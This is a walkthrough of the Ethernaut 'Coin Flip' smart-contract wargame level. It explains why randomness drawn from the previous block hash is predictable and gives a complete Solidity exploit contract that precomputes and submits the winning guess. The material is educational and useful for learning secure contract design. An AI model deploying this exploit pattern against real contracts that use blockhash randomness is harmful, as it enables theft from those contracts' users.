---
description: >-
  In Ethernaut's Coin Flip, we're introduced to the problem of randomness on a
  public, deterministic blockchain.
---

# 3 - Coin Flip

The goal of [this level](https://ethernaut.openzeppelin.com/level/0x4dF32584890A0026e56f7535d0f2C6486753624f) is to guess the correct outcome of the contract's "coin flip" 10 times in a row.

### Hints

<details>

<summary>Hint One</summary>

If the contract's `flip` function were truly random, this level would not be possible. How, exactly, does it determine the outcome of the coin flip? How could you use this same approach to improve your own guesses?

</details>

<details>

<summary>Hint Two</summary>

The outcome of each coin flip is a function of the hash of the last mined block. The hash is divided by a constant `FACTOR` and whether this quotient == 1 determines the result. You will need to perform this same calculation yourself prior to making each "guess". This code can be implemented in a smart contract of your own, that handles both calculating the correct guess and submitting it to the `CoinFlip` contract’s `flip` function.

</details>

### Full Walkthrough

The contract's `flip` function is responsible for simulating the outcome of the coin flip (a boolean) and checking it against the user's `_guess`. The issue with the way this feature has been implemented is that the outcome of the flip is purely a function of the hash of the last mined block, a public variable accessible to any user prior to them making their guess. Comments have been added to the contract snippet below for clarity.

```solidity
function flip(bool _guess) public returns (bool) {
  // This variable is publicly knowable prior to the function being called
  uint256 blockValue = uint256(blockhash(block.number.sub(1)));

  // The rest of the code below is incidental, the coin flip is purely a 
  // function of the (known) 'blockValue' variable above.

  if (lastHash == blockValue) {
    revert();
  }

  lastHash = blockValue;
  uint256 coinFlip = blockValue.div(FACTOR);
  bool side = coinFlip == 1 ? true : false;

  if (side == _guess) {
    consecutiveWins++;
    return true;
  } else {
    consecutiveWins = 0;
    return false;
  }
}
```

As we can determine the `blockValue` before calling the contract's `flip` function, we simply need to implement our own matching flip function to calculate our "guess" in advance of each transaction.

We'll write our own "proxy contract" in Solidity to handle calculating the outcome of the coin flip and then calling the `flip` function on the `CoinFlip` contract. Our contract will contain a `guess` function that will just need to be called ten times in a row. The approach below will always work as we will be executing both the calculation of our guess and the result of the `flip` function at once, meaning everything will be included in the same block so both contracts will have the same value of `block.number` (the current block height in which the transaction is being mined).

{% hint style="info" %}
**Global Variables and Global Functions**

We see both `block.number` and `blockHash` are accessible from within the smart contracts without being defined. This is because Solidity makes a number of useful variables and functions globally available. You can learn more in the Solidity [documentation](https://docs.soliditylang.org/en/v0.8.10/units-and-global-variables.html).
{% endhint %}

### Scripted Solution

```solidity
pragma solidity ^0.8.0;

import "./CoinFlip.sol";

contract CoinFlipExploit {
    CoinFlip public coinFlipContract;
    uint256 FACTOR =
        57896044618658097711785492504343953926634992332820282019728792003956564819968;

    /**
     * @dev Sets `coinFlipContract` to instance at `coinFlipContractAddress`.
     */
    constructor(address coinFlipContractAddress) {
        coinFlipContract = CoinFlip(coinFlipContractAddress);
    }

    /**
     * @dev Calls the CoinFlip contract's `flip` function with the correct guess.
     */
    function guess() public {
        uint256 previousBlockHash = uint256(blockhash(block.number - 1));
        bool side = (previousBlockHash / FACTOR) == 1 ? true : false;

        coinFlipContract.flip(side);
    }
}
```

### Key Takeaways

* Generating sufficiently random data is a challenge on a _**deterministic**_\*\* blockchain\*\* and is a problem best left to industry standard solutions like the Chainlink oracle's "Verifiable Random Function".
* Smart contracts on public blockchains are auditable by anyone. Any attempts to hide clever tricks in a contract's code are therefor ultimately futile.
* Solidity contains a number of useful globally available variables and functions we can use when writing our own contracts.
